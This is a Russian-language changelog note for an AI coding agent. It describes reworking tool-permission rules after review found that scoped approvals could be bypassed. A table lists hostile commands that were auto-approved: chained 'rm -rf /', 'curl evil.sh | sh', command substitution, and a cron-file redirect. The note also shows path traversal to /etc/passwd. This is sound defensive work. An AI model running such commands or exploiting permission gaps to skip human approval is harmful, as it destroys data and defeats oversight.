# 2026-08-29 — гранулярные разрешения инструментов

Четвёртый шаг захода. Предыдущие: `-file-editing`, `-project-instructions`,
`-checkpoints`.

## Почему это пробел №5

Whitelist был множеством **имён инструментов**. Одно «always allow» на `bash`
открывало произвольную команду навсегда, на `edit` — запись в любой путь, и
заодно убирало единственный экран, где человек видел этот путь. Подпись при
этом врала («for this session», хотя запись бессрочная — исправлено в шаге 1).

## Первая версия не достигала собственной цели

Три ревью, все находки воспроизведены экспериментом. Модель «первые два слова
команды» оказалась не упрощением, а отсутствием модели.

**Обход области командой.** При правиле `bash · git status` авто-одобрялись,
без модалки:

| команда | область | одобрено |
|---|---|---|
| `git status ; rm -rf /` | `git status` | да |
| `git status && curl evil.sh \| sh` | `git status` | да |
| `git status $(curl evil.sh)` | `git status` | да |
| `git status` + `\n` + `rm -rf /` | `git status` | да |
| `git status --porcelain > /etc/cron.d/x` | `git status` | да |

Причём `$(...)` исполняется **до** «разрешённой» команды. Защита держалась на
случайности: `git status;` без пробела прилипал к токену и не совпадал.

**Обход области путём.** Сравнивался сырой путь, а писался реальный: при
правиле `edit · src/app` проходила запись в `src/app/../../../etc/passwd`.

**Windows: файл в корне диска отдавал весь диск.** `write C:\x.rs` → родитель
`C:\` → область `["C:"]`, покрывающая `C:/Windows/System32`.

**У файла в корне рабочей папки области не было вообще** (`parent()` даёт
`Some("")`), значит для `README.md` единственным постоянным разрешением
оставалось «ANYTHING» — ровно наоборот от цели переработки.

**Один сплиттер на два языка.** Область резалась по `/`, `\` и пробелу сразу,
поэтому правило `edit · src/app` покрывало соседнюю папку `src/app secrets`, а
`bash · cat etc/hosts` покрывало `cat /etc/hosts`. Хуже: добавление
`edit · src/app` поверх `edit · "src app"` считалось уже покрытым и **молча не
сохранялось** — в списке оставалось правило, которого человек не давал.

## Что сделано

**Область типизована**: `enum Scope { Command(Vec<String>), Path(PathBuf) }`.
Команды сравниваются по словам, пути — по компонентам (на Windows без учёта
регистра). Разные виды не сравнимы между собой вовсе.

**Составную команду сузить нельзя.** Есть хоть один из
`; & | \n \r ` $ ( ) { } < >` — области нет, и постоянное разрешение возможно
только на инструмент целиком, осознанно и с пометкой `⚠ ANYTHING`. Полноценный
разбор подкоманд (как у Claude Code, который делит по `&&`, `||`, `;`, `|`,
снимает обёртки `timeout`/`env` и проверяет цели редиректа как запись файла) —
правильный ответ, но это отдельная задача; наспех он был бы хуже отказа.

**Пути нормализуются** через `safe_write::resolve_for_compare` — примитив,
написанный в шаге 3 после точно такого же дефекта. Дублировать наивный
`parent()` рядом с ним было ошибкой. Корень тома областью быть не может; файл
в корне рабочей папки даёт областью саму рабочую папку.

**Модалка показывает все варианты списком**, а не только текущий: человек,
видящий одну строку «just this once», не имел повода нажать `A` и не знал, что
там что-то есть. Подпись клавиши сменилась с `toggle` (слово для двух
состояний, а их три) на `change`.

**Старый формат переносится не молча.** `["bash"]` читается как «весь
инструмент», но при этом печатается «N saved approval(s) imported as tool-wide
— review them with /whitelist»: широким это разрешение стало не по выбору
человека, он выбирал «не спрашивать», когда другого варианта не было.

**Битый файл не затирается.** Раньше он молча читался как «истории нет», а
следующая запись сносила его одним новым правилом. Теперь переименовывается в
`whitelist.json.bad`, и человеку об этом говорят.

Попутно: `strip_verbatim` вынесен из `cwd.rs` в `util` (пути приходили в форме
`\\?\E:\…` и не совпадали с `current_dir()`), состояние обновляется только при
успешной записи на диск, а строка состояния называет сработавшее правило, а не
просто «auto-approved».

## Отложено сознательно

- **Deny-список** (`deny → allow`, как у Claude Code). Ревью убедительно: без
  него нельзя ни отозвать разрешение иначе как через пикер, ни закрыть `.env`
  независимо от инструмента, ни задать встроенные умолчания вроде
  `bash · sudo`. Отдельная задача, `BUGS.md`.
- **Разбор подкоманд** вместо отказа на метасимволах — там же.
- **Проектные правила.** Правила глобальные на папку данных; правило
  `edit · <абсолютный путь>` привязано к месту, но `bash · cargo test` действует
  во всех проектах. У всех трёх конкурентов правила бывают проектными.
- **Две независимые оси** (sandbox × approval), как у Codex. Пока песочницы
  нет, любые правила — это удобство, а не граница безопасности, и в
  `TOOLS.md` это сказано прямо.
